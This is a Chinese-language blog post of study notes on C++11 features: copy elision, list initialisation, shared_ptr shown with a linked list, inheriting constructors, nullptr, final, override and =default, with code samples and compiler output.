<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> _x = <span class="number">0</span>, <span class="type">int</span> _y = <span class="number">0</span>) : __x(_x), __y(_y)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;constructor called&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">const</span> Point &amp;point)</span><br><span class="line">    &#123;</span><br><span class="line">        __x = point.__x;</span><br><span class="line">        __y = point.__y;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;copy constructor called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">static</span> Point <span class="title">Origin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;generating origin point...&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="function">Point <span class="title">origin</span><span class="params">(<span class="number">1</span>,<span class="number">1</span>)</span></span>;</span><br><span class="line">        cout&lt;&lt;hex&lt;&lt;&amp;origin&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;origin point generated!&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> origin;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">x</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">y</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Point O=Point::<span class="built_in">Origin</span>();</span><br><span class="line">    cout&lt;&lt;&amp;O&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主函数里定义了一个Point
O,按照之前的认识,<code>Point O=Point::Origin();</code>这句话应该是这样执行的:</p>
<p>首先调用<code>Point::Origin()</code>,这个函数中会调用构造函数</p>
<p>接着<code>Point O=返回值</code>这里要对O调用拷贝构造函数</p>
<p>总共有两次调用构造函数,然而实际上只调用了一次</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\cpp&gt; g++ -std=c++11 main.cpp  -O0 -o main </span><br><span class="line">PS C:\Users\86135\Desktop\cpp&gt; ./main</span><br><span class="line">generating origin point...</span><br><span class="line">constructor called</span><br><span class="line">0x60fe88</span><br><span class="line">origin point generated!</span><br><span class="line">0x60fe88</span><br></pre></td></tr></table></figure>
<p>从两次地址的打印来看,两个对象实际上是一个对象,因此Origin函数可以认为返回的是这个对象的指针,从反汇编看确实如此</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">main中:</span><br><span class="line">lea     eax, [ebp+var_10]</span><br><span class="line">mov     [esp], eax      ; this</span><br><span class="line">call    __ZN5Point6OriginEv ; Point::Origin(void)</span><br><span class="line">lea     eax, [ebp+var_10]</span><br><span class="line">mov     ecx, eax</span><br><span class="line">Point::Origin中:</span><br><span class="line">mov     dword ptr [esp+4], 1 ; int</span><br><span class="line">mov     dword ptr [esp], 1 ; this</span><br><span class="line">mov     ecx, [ebp+this]</span><br><span class="line">call    __ZN5PointC1Eii ; Point::Point(int,int)</span><br></pre></td></tr></table></figure>
<h2 id="列表初始化">列表初始化</h2>
<p>在写词法分析器的时候有这么一个符号类</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Token</span></span><br><span class="line">&#123;</span><br><span class="line">    TokenType type;</span><br><span class="line">    std::string lexme;</span><br><span class="line">    <span class="type">double</span> value;</span><br><span class="line">    Func func;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Token</span>(TokenType t = ERRORTOKEN, std::string l = <span class="string">&quot;&quot;</span>, <span class="type">double</span> v = <span class="number">0.0</span>, Func f = <span class="literal">NULL</span>) : <span class="built_in">type</span>(t),</span><br><span class="line">                                                                                         <span class="built_in">lexme</span>(l),</span><br><span class="line">                                                                                         <span class="built_in">value</span>(v),</span><br><span class="line">                                                                                         <span class="built_in">func</span>(f)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">///...其他成员函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>现在需要建立一个内建符号表,如果使用老式的写法</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;Token&gt; built_in_token_table=&#123;</span><br><span class="line">	<span class="built_in">Token</span>(CONST_ID,<span class="string">&quot;PI&quot;</span>,<span class="number">3.1415926</span>,<span class="literal">NULL</span>),</span><br><span class="line">	<span class="built_in">Token</span>(CONST_ID,<span class="string">&quot;E&quot;</span>,<span class="number">2.71828</span>,<span class="literal">NULL</span>),</span><br><span class="line">	...</span><br><span class="line">	<span class="built_in">Token</span>(DRAW,<span class="string">&quot;DRAW&quot;</span>,<span class="number">0.0</span>,<span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>每个条目都要显式调用构造函数<code>Token(...)</code></p>
<p>而如果使用初始化列表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Token&gt; build_in_token_table = &#123;</span><br><span class="line">    &#123;CONST_ID, <span class="string">&quot;PI&quot;</span>, <span class="number">3.1415926</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">    &#123;CONST_ID, <span class="string">&quot;E&quot;</span>, <span class="number">2.71828</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">	...</span><br><span class="line">    &#123;DRAW, <span class="string">&quot;DRAW&quot;</span>, <span class="number">0.0</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这样效果和上面一模一样,也会调用构造函数,但是不用写<code>Token(...)</code>,实际上也是调用相应参数个数的构造函数</p>
<h2 id="lambda表达式">Lambda表达式</h2>
<p>在实验室电脑上,开学乎上</p>
<h2 id="智能指针">智能指针</h2>
<p>之前C++和C的堆内存管理责任全在程序员,new了不delete会内存泄漏,new了delete两次会造成二次释放漏洞.</p>
<p>而有些对象到底啥时候释放,可能人也把握不准,比如这次编译原理实验中,词法分析器的getToken函数总是返回一个Token*指针,函数内部会在堆上开一块内存放对象</p>
<p>然而parser在使用完了这个Token之后没有立刻释放,因为我也不知道啥时候一个Token才会真正使用完,比如一个T类型的Token,它作为变量可能会存在一段时间,提前析构了后来就会访问非法内存</p>
<p>于是Token几乎都存在内存泄漏,而我也不知道咋处理</p>
<p>智能指针就解决了这个困扰</p>
<p>智能指针实际上是对普通指针的包装,但是他会对对象有一个引用计数</p>
<p>每当有一个智能指针指向同一块内存的时候,引用计数就会加一,当一个智能指针消亡或者不再指向该内存的时候,引用计数减一,最后一个不再指向该内存的智能指针会发现引用计数从1到0,于是它会自动析构这个对象</p>
<p>显然就不用人操心在啥时候释放对象了</p>
<p>到底咋用呢?写一个链表类意思意思</p>
<p>关键词:<code>make_shared,shared_ptr</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LinkedNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> __key;</span><br><span class="line">    shared_ptr&lt;LinkedNode&gt; __next;</span><br><span class="line">    <span class="built_in">LinkedNode</span>(<span class="type">int</span> _key=<span class="number">0</span>,shared_ptr&lt;LinkedNode&gt; _next=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        __key=_key;</span><br><span class="line">        __next=_next;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;LinkedNode ctor called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">LinkedNode</span>()&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;LinkedNode dtor called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">shared_ptr&lt;LinkedNode&gt; <span class="title">getNext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getKey</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setNext</span><span class="params">(shared_ptr&lt;LinkedNode&gt; _next)</span></span>&#123;</span><br><span class="line">        __next=_next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setKey</span><span class="params">(<span class="type">int</span> _key)</span></span>&#123;</span><br><span class="line">        __key=_key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">toString</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">to_string</span>(__key);</span><br><span class="line">    &#125;</span><br><span class="line">    LinkedNode <span class="keyword">operator</span>=(<span class="type">const</span> LinkedNode &amp;)=<span class="keyword">delete</span>;</span><br><span class="line">    <span class="built_in">LinkedNode</span>(<span class="type">const</span> LinkedNode&amp;)=<span class="keyword">delete</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkedList</span>&#123;</span><br><span class="line">    shared_ptr&lt;LinkedNode&gt; head;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LinkedList</span>()&#123;</span><br><span class="line">        head=<span class="built_in">make_shared</span>&lt;LinkedNode&gt;(<span class="number">0</span>,<span class="literal">nullptr</span>);<span class="comment">//注意创建节点不再直接调用构造函数</span></span><br><span class="line">        <span class="comment">//使用make_shared&lt;类名&gt;(参数)创建对象,返回值用shared_ptr&lt;类名&gt;类型承载</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pushHead</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> node=<span class="built_in">make_shared</span>&lt;LinkedNode&gt;(key,head-&gt;<span class="built_in">getNext</span>());</span><br><span class="line">        head-&gt;<span class="built_in">setNext</span>(node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">popHead</span><span class="params">()</span></span>&#123;</span><br><span class="line">        head-&gt;<span class="built_in">setNext</span>(head-&gt;<span class="built_in">getNext</span>()-&gt;<span class="built_in">getNext</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>==head-&gt;<span class="built_in">getNext</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> p=head-&gt;<span class="built_in">getNext</span>();</span><br><span class="line">        string buffer;</span><br><span class="line">        <span class="keyword">while</span>(p!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            buffer+=p-&gt;<span class="built_in">toString</span>()+<span class="string">&quot;  &quot;</span>;</span><br><span class="line">            p=p-&gt;<span class="built_in">getNext</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkedList list;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        list.<span class="built_in">pushHead</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;list.<span class="built_in">toString</span>()&lt;&lt;endl;</span><br><span class="line">    list.<span class="built_in">popHead</span>();</span><br><span class="line">    cout&lt;&lt;list.<span class="built_in">toString</span>()&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\cpp&gt; g++ -std=c++11 main.cpp -O0 -o main</span><br><span class="line">PS C:\Users\86135\Desktop\cpp&gt; ./main</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">9  8  7  6  5  4  3  2  1  0</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">8  7  6  5  4  3  2  1  0</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br></pre></td></tr></table></figure>
<p>没有任何手动delete的地方,但是dtor依然被调用了</p>
<p><code>shared_ptr&lt;LinkedNode&gt;</code>和<code>LinkedNode *</code>,在用法上一模一样,都是使用箭头调用成员函数</p>
<p>但是<code>shared_ptr&lt;LinkedNode&gt;</code>实际上封装了一个<code>LinkedNode *</code>,前者还有其他功能</p>
<p>比如</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> node=<span class="built_in">make_shared</span>&lt;LinkedNode&gt;(<span class="number">0</span>,<span class="literal">nullptr</span>);</span><br><span class="line">cout&lt;&lt;hex&lt;&lt;node&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;node.<span class="built_in">get</span>()&lt;&lt;endl;<span class="comment">//get返回裸指针LinkedNode*</span></span><br></pre></td></tr></table></figure>
<p>node可以使用点号调用shared_ptr类的成员函数,使用箭头符号调用的是其托管对象类的成员函数</p>
<h2 id="继承构造函数">继承构造函数</h2>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> _x , <span class="type">int</span> _y ) :</span><br><span class="line">        __x(_x), __y(_y)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;constructor called&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">x</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">y</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">toString</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span>+<span class="built_in">to_string</span>(__x)+<span class="string">&quot;,&quot;</span>+<span class="built_in">to_string</span>(__y)+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TaggedPoint</span>:<span class="keyword">public</span> Point&#123;</span><br><span class="line">    string __tag;</span><br><span class="line">    <span class="keyword">using</span> Point::Point;<span class="comment">//继承父类所有构造函数</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">TaggedPoint</span>(<span class="type">int</span> _x,<span class="type">int</span> _y,string _tag):<span class="built_in">TaggedPoint</span>(_x,_y)&#123;<span class="comment">//委托构造函数,也是c++11特性</span></span><br><span class="line">        __tag=_tag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">toString</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __tag+Point::<span class="built_in">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">TaggedPoint <span class="title">A</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>)</span></span>;<span class="comment">//TaggedPoint本没有两个int的构造函数,但是其父类有</span></span><br><span class="line">    cout&lt;&lt;A.<span class="built_in">toString</span>()&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="nullptr">nullptr</h2>
<p>之前表示空指针都使用NULL,而实际上这是个int 0</p>
<p>c++11之后表示空指针的常量是nullptr</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">void</span> *ptr)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;ptr func called&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> value)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;value func called&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">func</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">func</span>(<span class="literal">NULL</span>);<span class="comment">//二义性警告,两个重载函数都是次完美匹配,</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\cpp&gt; g++ -std=c++11 main.cpp  -O0 -o main </span><br><span class="line">main.cpp: In <span class="keyword">function</span> <span class="string">&#x27;int main()&#x27;</span>:</span><br><span class="line">main.cpp:57:14: warning: passing NULL to non-pointer argument 1 of <span class="string">&#x27;void func(int)&#x27;</span> [-Wconversion-null]</span><br><span class="line">     func(NULL);</span><br><span class="line">              ^</span><br><span class="line">PS C:\Users\86135\Desktop\cpp&gt; ./main</span><br><span class="line">ptr func called</span><br><span class="line">value func called</span><br></pre></td></tr></table></figure>
<h2 id="final关键字">final关键字</h2>
<p>final修饰的类不允许被继承,不允许虚函数重载</p>
<h2 id="override关键字">override关键字</h2>
<p>override关键字修饰子类成员函数,保证是在重写父类同名函数,否则报错</p>
<h2 id="default构造函数">default构造函数</h2>
<p>在之前的c++中,如果一个类没有显式写构造函数,那么编译器会自动加上一个无参的隐式构造函数,这个构造函数几乎啥也不干(在汇编层面上会哦用子类虚表覆盖父类虚表,算是干了点东西,但是源代码层面无法体现)</p>
<p>假如显示定义了一个带参数的构造函数,则编译器不会再隐式添加无参构造函数,这时候就不能无参构造了</p>
<p>比如这样就会报编译错:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span>&#123;</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> _x,<span class="type">int</span> _y):__x(_x),__y(_y)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;ctor called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Point A;<span class="comment">//尝试调用缺省或者无参构造函数失败</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解决方法是另写一个无参的构造函数</p>
<p>在c++11中的解决方法是<code>Point()=default;</code></p>
